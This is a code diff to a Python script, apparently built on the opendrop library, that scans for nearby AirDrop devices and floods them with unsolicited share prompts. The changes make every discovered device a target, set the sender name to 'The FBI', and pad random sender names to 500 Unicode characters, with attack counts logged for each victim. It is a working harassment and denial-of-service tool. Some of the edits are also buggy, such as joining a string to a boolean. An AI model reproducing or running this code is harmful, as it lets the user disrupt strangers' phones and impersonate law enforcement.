@@ -6,22 +6,51 @@ import plistlib
 import random
 import threading
 import time
+import requests
 
 from colorama import Fore, Back, Style
 
 from opendrop.client import AirDropBrowser, AirDropClient
 from opendrop.config import AirDropConfig, AirDropReceiverFlags
+import random
+
+def get_random_unicode(length):
+
+    try:
+        get_char = unichr
+    except NameError:
+        get_char = chr
+
+    # Update this to include code point ranges to be sampled
+    include_ranges = [
+        ( 0x0021, 0x0021 ),
+        ( 0x0023, 0x0026 ),
+        ( 0x0028, 0x007E ),
+        ( 0x00A1, 0x00AC ),
+        ( 0x00AE, 0x00FF ),
+        ( 0x0100, 0x017F ),
+        ( 0x0180, 0x024F ),
+        ( 0x2C60, 0x2C7F ),
+        ( 0x16A0, 0x16F0 ),
+        ( 0x0370, 0x0377 ),
+        ( 0x037A, 0x037E ),
+        ( 0x0384, 0x038A ),
+        ( 0x038C, 0x038C ),
+    ]
+
+    alphabet = [
+        get_char(code_point) for current_range in include_ranges
+            for code_point in range(current_range[0], current_range[1] + 1)
+    ]
+    return ''.join(random.choice(alphabet) for i in range(length))
 
 start_new_lines = '\n' * 20
 end_new_lines = '\n' * 20
-SENDER_NAME = 'f'
+SENDER_NAME = 'The FBI'
+ALLOWED_ALL = True
 FILE_NAME = f"""
 {start_new_lines}
-⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
-
-Rostine likes Ayla
-
-⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️
+Goofy
 {end_new_lines}
 """
 
@@ -35,7 +64,6 @@ logging.basicConfig(level=logging.INFO, format=f'{Style.DIM}%(asctime)s{Style.RE
 def get_os_version(discover):
     try:
         receiver_media_cap = json.loads(discover['ReceiverMediaCapabilities'])
-        print(receiver_media_cap)
         return receiver_media_cap['Vendor']['com.apple']['OSVersion']
     except:
         pass
@@ -53,7 +81,10 @@ def get_is_vuln(os_version):
     return True
 
 def send_ask(node_info):
-    SENDER_NAME = ''.join(chr(random.randint(0x1F600, 0x1F64F)) for i in range(15))
+    
+    # set the SENDER_NAME to 15 random unicode charactewrs
+    
+    SENDER_NAME = get_random_unicode(500)
 
     ask_body = {
         'SenderComputerName': SENDER_NAME,
@@ -71,25 +102,27 @@ def send_ask(node_info):
     try:
         client = AirDropClient(config, (node_info['address'], node_info['port']))
         success, _ = client.send_POST('/Ask', ask_binary)
-        if success: # if user accepted
-            client.send_POST('/Upload', None)
+
+        print("Sent: " + success)
+
         return success
     except:
+        return True
         pass
 
 def send(node_info):
     name = node_info['name']
+    receiver_name = Fore.GREEN + name + Fore.RESET
+    # if name != "B":
+    #     return
     id = node_info['id']
     attack_count = attack_counts.get(id, 1)
-    receiver_name = Fore.GREEN + name + Fore.RESET
     logging.info(f'❔ Prompting   {receiver_name} (#{attack_count})')
     success = send_ask(node_info)
     if success == True:
-        logging.info(f'✅ Accepted by {receiver_name} (#{attack_count})')
+        logging.info(f'✅ Sent and cleared {receiver_name} (#{attack_count})')
     elif success == False:
         logging.info(f'❌ Declined by {receiver_name} (#{attack_count})')
-        # wait 5 seconds
-
     else:
         logging.info(f'🛑 Errored     {receiver_name} (#{attack_count})')
         success = False
@@ -157,7 +190,7 @@ def on_receiver_found(info):
         is_mac = get_is_mac(os_version)
         is_vuln = get_is_vuln(os_version)
         additional = f'{Style.DIM}{id} {hostname} [{address}]:{port}{Style.RESET_ALL}'
-        if is_mac:
+        if not ALLOWED_ALL and receiver_name != "B":
             logger.info('❌ Ignoring    {:32} macOS {:>7} {}'.format(Fore.YELLOW + receiver_name + Fore.RESET, os_v, additional))
         elif not is_vuln:
             logger.info('❌ Ignoring    {:32} iOS   {:>7} {}'.format(Fore.RED + receiver_name + Fore.RESET, os_v, additional))
